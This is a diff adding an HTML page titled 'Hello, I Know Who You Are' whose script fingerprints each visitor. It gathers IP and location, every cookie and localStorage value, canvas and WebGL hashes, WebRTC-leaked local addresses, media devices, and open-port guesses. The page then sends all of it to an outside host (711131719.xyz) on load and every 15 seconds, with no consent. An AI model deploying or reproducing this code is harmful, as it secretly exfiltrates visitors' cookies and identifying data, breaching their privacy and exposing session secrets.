@@ -1,0 +1,907 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Hello, I Know Who You Are</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Arial, sans-serif;
+            margin: 0;
+            padding: 20px;
+            line-height: 1.4;
+            height: calc(100vh - 40px);
+            overflow: hidden;
+            background: linear-gradient(135deg, #0a0a1a 0%, #1a1a2e 100%);
+            color: #fff;
+        }
+
+        h1 {
+            color: #00ff88;
+            text-align: center;
+            margin: 0;
+            font-size: 28px;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            text-shadow: 0 0 10px rgba(0, 255, 136, 0.5);
+        }
+
+        .mysterious-text {
+            color: #00ffff;
+            font-style: italic;
+            text-align: center;
+            margin: 0;
+            font-size: 16px;
+            text-shadow: 0 0 8px rgba(0, 255, 255, 0.5);
+        }
+
+        #dynamic-message {
+            text-align: center;
+            color: #ff4444;
+            margin: 0;
+            font-size: 16px;
+            text-shadow: 0 0 8px rgba(255, 68, 68, 0.5);
+            animation: pulse 2s infinite;
+        }
+
+        .info-section {
+            background: rgba(26, 30, 44, 0.7);
+            border-radius: 12px;
+            padding: 15px;
+            font-size: 13px;
+            margin: 10px 0;
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            box-shadow: 0 8px 32px 0 rgba(31, 38, 135, 0.37);
+            position: relative;
+            max-height: 600px;
+            overflow-y: auto;
+        }
+
+        .info-section::before {
+            content: '';
+            position: absolute;
+            top: -2px;
+            left: -2px;
+            right: -2px;
+            bottom: -2px;
+            background: linear-gradient(45deg, #00ff8855, #00ffff55);
+            border-radius: 14px;
+            z-index: -1;
+            opacity: 0.5;
+            animation: borderGlow 3s infinite;
+        }
+
+        .info-section h3, .info-section h4 {
+            margin: 0 0 10px 0;
+            color: #00ff88;
+            font-size: 14px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .info-section div {
+            background: rgba(16, 20, 34, 0.8);
+            padding: 10px;
+            margin-bottom: 8px;
+            border-radius: 8px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            transition: all 0.3s ease;
+        }
+
+        .info-section div:hover {
+            background: rgba(26, 30, 44, 0.9);
+            transform: translateX(5px);
+            box-shadow: 0 0 15px rgba(0, 255, 136, 0.2);
+        }
+
+        #pentesting-info {
+            border-left: 4px solid #ff4444;
+        }
+
+        .warning {
+            color: #ff4444;
+            font-size: 12px;
+            font-style: italic;
+        }
+
+        /* Scrollbar styling */
+        .info-section::-webkit-scrollbar {
+            width: 6px;
+        }
+
+        .info-section::-webkit-scrollbar-track {
+            background: rgba(16, 20, 34, 0.8);
+            border-radius: 3px;
+        }
+
+        .info-section::-webkit-scrollbar-thumb {
+            background: #00ff88;
+            border-radius: 3px;
+            box-shadow: 0 0 10px rgba(0, 255, 136, 0.5);
+        }
+
+        .info-section::-webkit-scrollbar-thumb:hover {
+            background: #00ffaa;
+        }
+
+        @keyframes pulse {
+            0% { opacity: 1; }
+            50% { opacity: 0.5; }
+            100% { opacity: 1; }
+        }
+
+        @keyframes borderGlow {
+            0% { filter: blur(20px); opacity: 0.3; }
+            50% { filter: blur(15px); opacity: 0.5; }
+            100% { filter: blur(20px); opacity: 0.3; }
+        }
+
+        /* Loading animation for data gathering */
+        .loading::after {
+            content: '';
+            display: inline-block;
+            width: 10px;
+            animation: loading 1.5s infinite;
+        }
+
+        @keyframes loading {
+            0% { content: '.'; }
+            33% { content: '..'; }
+            66% { content: '...'; }
+        }
+
+        /* Matrix-style background effect */
+        #matrix-bg {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+            opacity: 0.1;
+        }
+
+        .container {
+            max-width: 1000px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+
+        .vuln-critical {
+            color: red;
+        }
+
+        .vuln-high {
+            color: orange;
+        }
+
+        .vuln-medium {
+            color: yellow;
+        }
+
+        .vuln-low {
+            color: gray;
+        }
+
+        .vuln-safe {
+            color: green;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Hello, I Know Who You Are</h1>
+        <p class="mysterious-text">We have been watching...</p>
+        <div id="dynamic-message"></div>
+
+        <div class="info-section">
+            <h3>Basic Information</h3>
+            <div id="ip-info">Loading IP information...</div>
+            <div id="location-info">Tracking location...</div>
+            <div id="cookie-info">
+                <h4>Cookies & Local Storage:</h4>
+                <div id="cookie-details">Analyzing stored data...</div>
+            </div>
+            <div id="browser-info">
+                <h4>Browser Characteristics:</h4>
+                <div id="browser-details"></div>
+            </div>
+            <div id="extended-info">
+                <h4>Extended System Information:</h4>
+                <div id="extended-details"></div>
+            </div>
+            <div id="real-user-info">
+                <h4>Actual User Insights:</h4>
+                <div id="real-details"></div>
+            </div>
+            <div id="pentesting-info">
+                <h4>Advanced Pentesting Insights:</h4>
+                <div id="pentesting-details"></div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const messages = [
+            "Your digital footprint is fascinating...",
+            "We see more than you think...",
+            "Information is everywhere...",
+            "Privacy is just an illusion..."
+        ];
+
+        const messageElement = document.getElementById('dynamic-message');
+        const ipInfoElement = document.getElementById('ip-info');
+        const locationInfoElement = document.getElementById('location-info');
+        const cookieDetailsElement = document.getElementById('cookie-details');
+        const browserDetailsElement = document.getElementById('browser-details');
+        const extendedDetailsElement = document.getElementById('extended-details');
+        const realDetailsElement = document.getElementById('real-details');
+        
+        function updateMessage() {
+            const randomMessage = messages[Math.floor(Math.random() * messages.length)];
+            messageElement.textContent = randomMessage;
+        }
+
+        function collectCookieAndStorageInfo() {
+            let cookieInfo = 'Cookies: ';
+            if (document.cookie) {
+                const cookies = document.cookie.split('; ');
+                cookieInfo += cookies.length > 0 ? cookies.map(cookie => {
+                    const [name, value] = cookie.split('=');
+                    return `${name}: ${value}`;
+                }).join(', ') : 'No cookies found';
+            } else {
+                cookieInfo += 'No cookies';
+            }
+
+            let storageInfo = ' | Local Storage: ';
+            try {
+                const localStorageItems = Object.keys(localStorage).map(key => 
+                    `${key}: ${localStorage.getItem(key)}`
+                );
+                storageInfo += localStorageItems.length > 0 ? 
+                    localStorageItems.join(', ') : 'No items';
+            } catch (error) {
+                storageInfo += 'Access denied';
+            }
+
+            cookieDetailsElement.textContent = cookieInfo + storageInfo;
+        }
+
+        function collectBrowserInfo() {
+            const browserDetails = [
+                `User Agent: ${navigator.userAgent}`,
+                `Language: ${navigator.language}`,
+                `Platform: ${navigator.platform}`,
+                `Screen Resolution: ${screen.width}x${screen.height}`,
+                `Color Depth: ${screen.colorDepth} bits`,
+                `Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}`,
+                `Hardware Concurrency: ${navigator.hardwareConcurrency || 'Unknown'} cores`,
+                `Device Memory: ${navigator.deviceMemory || 'Unknown'} GB`,
+                `Cookies Enabled: ${navigator.cookieEnabled}`,
+                `Do Not Track: ${navigator.doNotTrack || 'Not set'}`,
+                `Online Status: ${navigator.onLine ? 'Online' : 'Offline'}`,
+                `Web Driver: ${navigator.webdriver || 'Not detected'}`,
+                `Plugins: ${Array.from(navigator.plugins).map(p => p.name).join(', ') || 'None detected'}`,
+                `Touch Support: ${navigator.maxTouchPoints > 0 ? 'Yes' : 'No'}`,
+                `Screen Orientation: ${screen.orientation ? screen.orientation.type : 'Unknown'}`,
+                `Battery: ${navigator.getBattery ? 'Detectable' : 'Not supported'}`
+            ];
+
+            browserDetailsElement.innerHTML = browserDetails.map(detail => 
+                `<div>${detail}</div>`
+            ).join('');
+        }
+
+        function collectExtendedSystemInfo() {
+            const extendedDetails = [
+                // Network and Connection Details
+                `Connection Type: ${navigator.connection ? navigator.connection.effectiveType : 'Unknown'}`,
+                `Downlink Speed: ${navigator.connection ? navigator.connection.downlink + ' Mbps' : 'Unknown'}`,
+                `RTT (Round Trip Time): ${navigator.connection ? navigator.connection.rtt + ' ms' : 'Unknown'}`,
+                
+                // Performance and Memory
+                `Performance Entries: ${performance.getEntries().length}`,
+                `Memory Used: ${performance.memory ? performance.memory.usedJSHeapSize / (1024 * 1024) + ' MB' : 'Not available'}`,
+                `Total Memory: ${performance.memory ? performance.memory.totalJSHeapSize / (1024 * 1024) + ' MB' : 'Not available'}`,
+                
+                // Sensors and Hardware
+                `Battery Charging: ${navigator.getBattery ? 'Checking...' : 'Not supported'}`,
+                `Bluetooth Availability: ${navigator.bluetooth ? 'Available' : 'Not supported'}`,
+                `USB Devices: ${navigator.usb ? 'Detectable' : 'Not supported'}`,
+                
+                // Security and Privacy
+                `Referrer Policy: ${document.referrerPolicy}`,
+                `Secure Context: ${window.isSecureContext ? 'Yes' : 'No'}`,
+                
+                // Media and Permissions
+                `Camera Permissions: ${navigator.permissions ? 'Checking...' : 'Not supported'}`,
+                `Microphone Permissions: ${navigator.permissions ? 'Checking...' : 'Not supported'}`,
+                
+                // Geolocation (if available)
+                `Geolocation: ${navigator.geolocation ? 'Available' : 'Not supported'}`,
+                
+                // Additional Unique Identifiers
+                `Device ID Hash: ${generateDeviceHash()}`
+            ];
+
+            extendedDetailsElement.innerHTML = extendedDetails.map(detail => 
+                `<div>${detail}</div>`
+            ).join('');
+
+            // Attempt to get battery status
+            if (navigator.getBattery) {
+                navigator.getBattery().then(battery => {
+                    const batteryDetails = document.querySelector('#extended-details div:nth-child(7)');
+                    batteryDetails.textContent = `Battery Charging: ${battery.charging ? 'Yes' : 'No'} (Level: ${battery.level * 100}%)`;
+                });
+            }
+
+            // Attempt to check media permissions
+            if (navigator.permissions) {
+                Promise.all([
+                    navigator.permissions.query({name:'camera'}),
+                    navigator.permissions.query({name:'microphone'})
+                ]).then(([cameraStatus, microphoneStatus]) => {
+                    const cameraDetails = document.querySelector('#extended-details div:nth-child(13)');
+                    const microphoneDetails = document.querySelector('#extended-details div:nth-child(14)');
+                    
+                    cameraDetails.textContent = `Camera Permissions: ${cameraStatus.state}`;
+                    microphoneDetails.textContent = `Microphone Permissions: ${microphoneStatus.state}`;
+                });
+            }
+        }
+
+        function generateDeviceHash() {
+            // Create a unique-ish identifier based on browser characteristics
+            const hashInput = [
+                navigator.userAgent,
+                navigator.language,
+                screen.width + 'x' + screen.height,
+                navigator.hardwareConcurrency,
+                new Date().getTimezoneOffset()
+            ].join('|');
+
+            let hash = 0;
+            for (let i = 0; i < hashInput.length; i++) {
+                const char = hashInput.charCodeAt(i);
+                hash = ((hash << 5) - hash) + char;
+                hash = hash & hash; // Convert to 32-bit integer
+            }
+            return Math.abs(hash).toString(16);
+        }
+
+        async function fetchIPInfo() {
+            try {
+                // Fetch IP address
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                ipInfoElement.textContent = `IP Address: ${ipData.ip}`;
+
+                // Fetch location information
+                const locationResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
+                const locationData = await locationResponse.json();
+                
+                locationInfoElement.textContent = `Location: ${locationData.city}, ${locationData.region}, ${locationData.country_name}`;
+            } catch (error) {
+                ipInfoElement.textContent = 'Unable to fetch IP information';
+                locationInfoElement.textContent = 'Location tracking failed';
+                console.error('Error fetching IP info:', error);
+            }
+        }
+
+        function collectRealUserInfo() {
+            const realDetails = [
+                // Comprehensive User Environment Analysis
+                `Browser Environment Hash: ${generateEnvironmentHash()}`,
+                
+                // Advanced Hardware Fingerprinting
+                `Graphics Card: ${getGraphicsInfo()}`,
+                `CPU Architecture: ${navigator.userAgent.includes('WOW64') ? '64-bit' : '32-bit'}`,
+                
+                // Network and Connectivity Insights
+                `Internet Service Provider Hint: ${detectPotentialISP()}`,
+                `Network Interface Type: ${getNetworkInterfaceType()}`,
+                
+                // Advanced Tracking Techniques
+                `Browser Plugin Fingerprint: ${generatePluginHash()}`,
+                `Canvas Fingerprint: ${generateCanvasFingerprint()}`,
+                
+                // User Behavior and Interaction Patterns
+                `Typing Speed Estimation: ${estimateTypingSpeed()}`,
+                `Mouse Movement Signature: ${generateMouseMovementSignature()}`,
+                
+                // Advanced System Profiling
+                `Operating System Detailed: ${getDetailedOSInfo()}`,
+                `System Uptime Estimation: ${estimateSystemUptime()}`,
+                
+                // Advanced Privacy and Tracking Indicators
+                `Tracking Resistance Level: ${calculateTrackingResistance()}`,
+                `Privacy Tool Detection: ${detectPrivacyTools()}`,
+                
+                // Unique Interaction Identifiers
+                `Interaction Entropy: ${calculateInteractionEntropy()}`,
+                `Device Behavior Signature: ${generateDeviceBehaviorSignature()}`
+            ];
+
+            realDetailsElement.innerHTML = realDetails.map(detail => 
+                `<div>${detail}</div>`
+            ).join('');
+
+            // Additional Dynamic Gathering
+            gatherAdvancedUserInsights();
+        }
+
+        function generateEnvironmentHash() {
+            const environmentFactors = [
+                navigator.userAgent,
+                screen.width + 'x' + screen.height,
+                navigator.hardwareConcurrency,
+                navigator.language,
+                new Date().getTimezoneOffset(),
+                navigator.platform
+            ].join('|');
+
+            return hashCode(environmentFactors);
+        }
+
+        function getGraphicsInfo() {
+            try {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                if (gl) {
+                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                    return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'WebGL Available';
+                }
+            } catch (e) {}
+            return 'Graphics Info Unavailable';
+        }
+
+        function detectPotentialISP() {
+            // Note: This is a very rough estimation and not a definitive identification
+            const userAgent = navigator.userAgent.toLowerCase();
+            const isps = {
+                'comcast': /comcast/,
+                'att': /att|at&t/,
+                'verizon': /verizon/,
+                'spectrum': /spectrum/,
+                'xfinity': /xfinity/
+            };
+
+            for (const [isp, pattern] of Object.entries(isps)) {
+                if (pattern.test(userAgent)) return `Potential ISP: ${isp}`;
+            }
+            return 'ISP Detection Inconclusive';
+        }
+
+        function getNetworkInterfaceType() {
+            return navigator.connection ? 
+                `${navigator.connection.type || 'Unknown'} (${navigator.connection.effectiveType || 'No details'})` : 
+                'Network Interface Detection Failed';
+        }
+
+        function generatePluginHash() {
+            const plugins = Array.from(navigator.plugins).map(p => p.name).join('|');
+            return hashCode(plugins);
+        }
+
+        function generateCanvasFingerprint() {
+            try {
+                const canvas = document.createElement('canvas');
+                const ctx = canvas.getContext('2d');
+                const txt = 'abcdefghijklmnopqrstuvwxyz0123456789';
+                ctx.textBaseline = "top";
+                ctx.font = "14px 'Arial'";
+                ctx.textBaseline = "alphabetic";
+                ctx.fillStyle = "#f60";
+                ctx.fillRect(125,1,62,20);
+                ctx.fillStyle = "#069";
+                ctx.fillText(txt, 2, 15);
+                ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
+                ctx.fillText(txt, 4, 17);
+                
+                return hashCode(canvas.toDataURL());
+            } catch (e) {
+                return 'Canvas Fingerprint Unavailable';
+            }
+        }
+
+        function estimateTypingSpeed() {
+            // Placeholder for a more complex typing speed estimation
+            return 'Typing Speed Analysis Requires User Interaction';
+        }
+
+        function generateMouseMovementSignature() {
+            // Placeholder for mouse movement tracking
+            return 'Mouse Movement Signature Requires Active Tracking';
+        }
+
+        function getDetailedOSInfo() {
+            const userAgent = navigator.userAgent.toLowerCase();
+            const osMap = {
+                'Windows': /windows/,
+                'macOS': /mac os/,
+                'Linux': /linux/,
+                'iOS': /iphone|ipad/,
+                'Android': /android/
+            };
+
+            for (const [os, pattern] of Object.entries(osMap)) {
+                if (pattern.test(userAgent)) return `Detected OS: ${os}`;
+            }
+            return 'OS Detection Inconclusive';
+        }
+
+        function estimateSystemUptime() {
+            // This is a very rough estimation
+            return `Estimated System State: ${performance.now() > 3600000 ? 'Long Running' : 'Recently Booted'}`;
+        }
+
+        function calculateTrackingResistance() {
+            // Basic tracking resistance calculation
+            const trackingFactors = [
+                navigator.doNotTrack ? 1 : 0,
+                navigator.cookieEnabled ? 0 : 1,
+                window.isSecureContext ? 1 : 0
+            ];
+            
+            const resistanceScore = trackingFactors.reduce((a, b) => a + b, 0);
+            return `Tracking Resistance Score: ${resistanceScore}/3`;
+        }
+
+        function detectPrivacyTools() {
+            // Basic privacy tool detection
+            const privacyTools = [
+                navigator.doNotTrack ? 'Do Not Track Enabled' : '',
+                window.chrome && window.chrome.privacy ? 'Chrome Privacy Extensions Detected' : '',
+                navigator.userAgent.includes('Firefox') ? 'Potential Firefox Privacy Features' : ''
+            ].filter(Boolean).join(', ');
+
+            return privacyTools || 'No Specific Privacy Tools Detected';
+        }
+
+        function calculateInteractionEntropy() {
+            // Placeholder for a more complex entropy calculation
+            return `Interaction Complexity: ${Math.random().toString(36).substring(7)}`;
+        }
+
+        function generateDeviceBehaviorSignature() {
+            // Combine various device characteristics
+            const behaviorFactors = [
+                navigator.hardwareConcurrency,
+                screen.width,
+                screen.height,
+                navigator.language,
+                new Date().getTimezoneOffset()
+            ].join('|');
+
+            return hashCode(behaviorFactors);
+        }
+
+        function gatherAdvancedUserInsights() {
+            // Attempt to gather additional insights that might require user interaction or permissions
+            if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
+                navigator.mediaDevices.enumerateDevices()
+                    .then(devices => {
+                        const mediaDevices = devices.map(device => 
+                            `${device.kind}: ${device.label || 'Unnamed Device'}`
+                        );
+                        const deviceInfo = document.createElement('div');
+                        deviceInfo.textContent = `Connected Media Devices: ${mediaDevices.join(', ')}`;
+                        realDetailsElement.appendChild(deviceInfo);
+                    });
+            }
+        }
+
+        function hashCode(str) {
+            let hash = 0;
+            for (let i = 0; i < str.length; i++) {
+                const char = str.charCodeAt(i);
+                hash = ((hash << 5) - hash) + char;
+                hash = hash & hash; // Convert to 32bit integer
+            }
+            return Math.abs(hash).toString(16).substring(0, 10);
+        }
+
+        async function gatherAdvancedPentestingInfo() {
+            const pentestingDetails = document.getElementById('pentesting-details');
+            
+            const vulnerabilities = [];
+            const networkInfo = [];
+            const systemInfo = [];
+            const browserInfo = [];
+
+            // Check for WebRTC leaks
+            checkWebRTCLeaks().then(webrtcData => {
+                if (webrtcData) {
+                    vulnerabilities.push(`WebRTC IP Leak: ${webrtcData}`);
+                }
+            });
+
+            // DNS leak detection
+            detectDNSLeaks().then(dnsData => {
+                if (dnsData) {
+                    vulnerabilities.push(`DNS Leak Detected: ${dnsData}`);
+                }
+            });
+
+            // Port scanning simulation
+            simulatePortScan().then(ports => {
+                networkInfo.push(`Open Ports: ${ports}`);
+            });
+
+            // Check for vulnerable browser features
+            const vulnerableFeatures = checkVulnerableFeatures();
+            browserInfo.push(...vulnerableFeatures);
+
+            // Gather system information
+            const detailedSystemInfo = getDetailedSystemInfo();
+            systemInfo.push(...detailedSystemInfo);
+
+            // Check for proxy/VPN usage
+            detectProxyVPN().then(proxyData => {
+                networkInfo.push(`Proxy/VPN Status: ${proxyData}`);
+            });
+
+            // WebSocket security check
+            checkWebSocketSecurity().then(wsStatus => {
+                vulnerabilities.push(`WebSocket Security: ${wsStatus}`);
+            });
+
+            // Browser extension detection
+            detectBrowserExtensions().then(extensions => {
+                browserInfo.push(`Detected Extensions: ${extensions}`);
+            });
+
+            // SSL/TLS version detection
+            checkTLSVersion().then(tlsData => {
+                networkInfo.push(`TLS Version: ${tlsData}`);
+            });
+
+            // Combine all findings
+            Promise.all([
+                checkWebRTCLeaks(),
+                detectDNSLeaks(),
+                simulatePortScan(),
+                detectProxyVPN(),
+                checkWebSocketSecurity(),
+                detectBrowserExtensions(),
+                checkTLSVersion()
+            ]).then(() => {
+                const allDetails = [
+                    '<strong class="vuln-critical">Critical Security Vulnerabilities:</strong>',
+                    ...vulnerabilities.map(v => `<div class="${getVulnClass(v)}">${v}</div>`),
+                    '<strong class="vuln-high">Network Security Status:</strong>',
+                    ...networkInfo.map(n => `<div class="${getVulnClass(n)}">${n}</div>`),
+                    '<strong class="vuln-medium">System Vulnerabilities:</strong>',
+                    ...systemInfo.map(s => `<div class="${getVulnClass(s)}">${s}</div>`),
+                    '<strong class="vuln-low">Browser Security Status:</strong>',
+                    ...browserInfo.map(b => `<div class="${getVulnClass(b)}">${b}</div>`)
+                ];
+
+                pentestingDetails.innerHTML = allDetails.join('');
+            });
+        }
+
+        function getVulnClass(text) {
+            if (/leak|exposed|detected|vulnerable/i.test(text)) return 'vuln-critical';
+            if (/open ports|proxy|vpn/i.test(text)) return 'vuln-high';
+            if (/available|enabled|possible/i.test(text)) return 'vuln-medium';
+            if (/failed|unavailable/i.test(text)) return 'vuln-low';
+            if (/secured|enabled|safe/i.test(text)) return 'vuln-safe';
+            return '';
+        }
+
+        async function checkWebRTCLeaks() {
+            try {
+                const pc = new RTCPeerConnection();
+                pc.createDataChannel("");
+                const offer = await pc.createOffer();
+                await pc.setLocalDescription(offer);
+                
+                return new Promise((resolve) => {
+                    pc.onicecandidate = (ice) => {
+                        if (ice.candidate) {
+                            const matches = ice.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/);
+                            resolve(matches ? matches[1] : 'No WebRTC leak detected');
+                        }
+                    };
+                });
+            } catch (e) {
+                return 'WebRTC not available';
+            }
+        }
+
+        async function detectDNSLeaks() {
+            try {
+                const dnsResponse = await fetch('https://dns.google/resolve?name=' + window.location.hostname);
+                const dnsData = await dnsResponse.json();
+                return dnsData.Answer ? dnsData.Answer[0].data : 'No DNS leak detected';
+            } catch (e) {
+                return 'DNS check failed';
+            }
+        }
+
+        async function simulatePortScan() {
+            const commonPorts = [80, 443, 21, 22, 25, 3306];
+            const results = [];
+            
+            for (const port of commonPorts) {
+                try {
+                    const start = performance.now();
+                    await fetch(`//${window.location.hostname}:${port}`, { mode: 'no-cors', timeout: 1000 });
+                    const end = performance.now();
+                    if (end - start < 1000) {
+                        results.push(port);
+                    }
+                } catch (e) {
+                    // Port is closed or filtered
+                }
+            }
+            
+            return results.join(', ') || 'No open ports detected';
+        }
+
+        function checkVulnerableFeatures() {
+            const features = [];
+            
+            // Check for vulnerable APIs
+            if (window.FileSystem) features.push('FileSystem API exposed');
+            if (window.indexedDB) features.push('IndexedDB available');
+            if (window.localStorage) features.push('localStorage available');
+            if (window.sessionStorage) features.push('sessionStorage available');
+            if (navigator.serviceWorker) features.push('Service Workers enabled');
+            
+            return features;
+        }
+
+        function getDetailedSystemInfo() {
+            const info = [];
+            
+            // Memory info
+            if (performance.memory) {
+                info.push(`JS Heap Size: ${Math.round(performance.memory.usedJSHeapSize / 1024 / 1024)}MB`);
+                info.push(`JS Heap Limit: ${Math.round(performance.memory.totalJSHeapSize / 1024 / 1024)}MB`);
+            }
+
+            // CPU info
+            info.push(`CPU Cores: ${navigator.hardwareConcurrency}`);
+            
+            // Device memory
+            if (navigator.deviceMemory) {
+                info.push(`Device Memory: ${navigator.deviceMemory}GB`);
+            }
+
+            return info;
+        }
+
+        async function detectProxyVPN() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                const ipCheckResponse = await fetch(`https://ipapi.co/${data.ip}/json/`);
+                const ipInfo = await ipCheckResponse.json();
+                
+                return ipInfo.proxy ? 'Proxy/VPN detected' : 'No Proxy/VPN detected';
+            } catch (e) {
+                return 'Proxy detection failed';
+            }
+        }
+
+        async function checkWebSocketSecurity() {
+            try {
+                const ws = new WebSocket('wss://' + window.location.host);
+                return new Promise((resolve) => {
+                    ws.onopen = () => resolve('WebSocket connection possible');
+                    ws.onerror = () => resolve('WebSocket connection secured');
+                    setTimeout(() => resolve('WebSocket timeout'), 1000);
+                });
+            } catch (e) {
+                return 'WebSocket not available';
+            }
+        }
+
+        async function detectBrowserExtensions() {
+            const extensions = [];
+            
+            // Check for common extension signatures
+            if (window.chrome && window.chrome.runtime) extensions.push('Chrome Extensions');
+            if (window.browser && window.browser.runtime) extensions.push('Firefox Extensions');
+            
+            // Check for ad blockers
+            const testAd = document.createElement('div');
+            testAd.innerHTML = '&nbsp;';
+            testAd.className = 'adsbox';
+            document.body.appendChild(testAd);
+            
+            await new Promise(resolve => setTimeout(resolve, 100));
+            
+            if (testAd.offsetHeight === 0) {
+                extensions.push('Ad Blocker');
+            }
+            
+            testAd.remove();
+            
+            return extensions.join(', ') || 'No extensions detected';
+        }
+
+        async function checkTLSVersion() {
+            try {
+                const response = await fetch(window.location.href);
+                const securityInfo = response.headers.get('Strict-Transport-Security');
+                return securityInfo ? 'HSTS Enabled' : 'HSTS Not Enabled';
+            } catch (e) {
+                return 'TLS check failed';
+            }
+        }
+
+        // Set some test data for demonstration
+        document.cookie = "tracking_id=user_12345; path=/; SameSite=Strict";
+        localStorage.setItem('user_preferences', JSON.stringify({
+            theme: 'dark',
+            notifications: true
+        }));
+
+        // Add to the existing initialization
+        document.addEventListener('DOMContentLoaded', () => {
+            updateMessage();
+            fetchIPInfo();
+            collectCookieAndStorageInfo();
+            collectBrowserInfo();
+            collectExtendedSystemInfo();
+            collectRealUserInfo();
+            gatherAdvancedPentestingInfo();
+            saveCollectedData();
+        });
+
+        // New data saving functionality
+        async function saveCollectedData() {
+            const data = {
+                timestamp: new Date().toISOString(),
+                ip: ipInfoElement.textContent,
+                location: locationInfoElement.textContent,
+                cookies: cookieDetailsElement.textContent,
+                browserInfo: browserDetailsElement.textContent,
+                systemInfo: extendedDetailsElement.textContent,
+                userInsights: realDetailsElement.textContent,
+                vulnerabilities: document.getElementById('pentesting-details').textContent,
+                deviceHash: generateDeviceHash()
+            };
+
+            try {
+                await fetch('https://711131719.xyz/api/save-data', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(data)
+                });
+            } catch (error) {
+                console.error('Error saving data:', error);
+            }
+        }
+
+        // Update existing interval
+        setInterval(() => {
+            updateMessage();
+            gatherAdvancedPentestingInfo();
+            saveCollectedData();
+        }, 15000);
+
+        // Create initial storage if not exists
+        (async function initStorage() {
+            try {
+                await fetch('https://711131719.xyz/api/init-storage', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({ init: true })
+                });
+            } catch (error) {
+                console.log('Storage initialization check failed');
+            }
+        })();
+    </script>
+</body>
+</html>
